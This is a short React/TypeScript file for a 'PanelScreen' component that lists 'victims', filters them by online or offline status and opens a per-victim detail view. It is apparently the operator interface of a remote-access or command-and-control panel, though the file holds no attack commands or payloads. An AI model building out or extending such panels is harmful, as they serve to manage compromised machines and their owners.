import { useVictimsList } from "../hooks/use-victims-list";
import type { VictimsFilter } from "../state/victims-filter";
import { VictimsTable } from "../panel/victims-table/victims-table";
import { VictimsFilterModal } from "../panel/victims-table/victims-filter-modal";
import { DetailView } from "../panel/detail/detail-view";
import { usePanelDetailView } from "../panel/detail/panel-detail-view-provider";

import { isVictimOnline } from "../panel/utils/victim-status";

export function PanelScreen(props: { filter: VictimsFilter }) {
  const { filter } = props;
  const victimsQuery = useVictimsList();
  const victims = victimsQuery.victims;
  const detail = usePanelDetailView();

  // Keep old filtering behavior.
  const visibleVictims = victims.filter((v) => {
    const online = isVictimOnline(v);
    if (filter === "online") return online;
    if (filter === "offline") return !online;
    return true;
  });

  return (
    <>
      <VictimsFilterModal />

      {!detail.isOpen && (
        <div id="panelView" className="view h-full">
          <VictimsTable
            victims={visibleVictims}
            isLoading={victimsQuery.isLoading}
            isError={victimsQuery.isError}
            selectedVictimId={detail.selectedVictimId}
            onSelectVictim={detail.selectVictim}
            onOpenDetail={detail.openDetailForVictim}
            onSnapshotVictim={(v) => {
              try {
                detail.rememberVictimSnapshot(v);
              } catch {
              }
            }}
          />
        </div>
      )}

      <DetailView victims={victims} />
    </>
  );
}